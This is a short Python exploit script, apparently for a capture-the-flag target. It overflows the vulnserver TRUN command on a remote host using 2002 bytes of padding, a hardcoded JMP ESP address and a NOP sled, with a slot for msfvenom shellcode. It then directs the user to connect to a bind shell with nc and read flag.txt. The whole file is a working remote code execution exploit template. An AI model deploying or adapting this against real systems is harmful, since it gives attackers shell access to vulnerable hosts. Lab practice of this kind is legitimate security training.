#!/usr/bin/env python3
import socket
import struct
import time

HOST = "34.62.69.250"
PORT = 41059

# Classic vulnserver essfunc.dll value.
# For your uploaded DLL, base+0x1023 is 0x10001023, but that contains a null byte.
# Replace this with the real non-null JMP ESP from the remote module layout.
JMP_ESP = 0x625011AF

# Paste msfvenom output here:
sc = b""
# example:
# sc = b"\xdb\xcd..." 

payload  = b"TRUN /.:/ "
payload += b"A" * 2002
payload += struct.pack("<I", JMP_ESP)
payload += b"\x90" * 32
payload += sc
payload += b"C" * (5000 - len(payload))

s = socket.create_connection((HOST, PORT), timeout=5)
print(s.recv(1024))
s.sendall(payload)

print("[+] Payload sent. Try connecting to bind shell:")
print(f"    nc {HOST} 4444")
print("Then run:")
print("    type flag.txt")
a = input("Input: ")
s.sendall(a.encode())
s.close()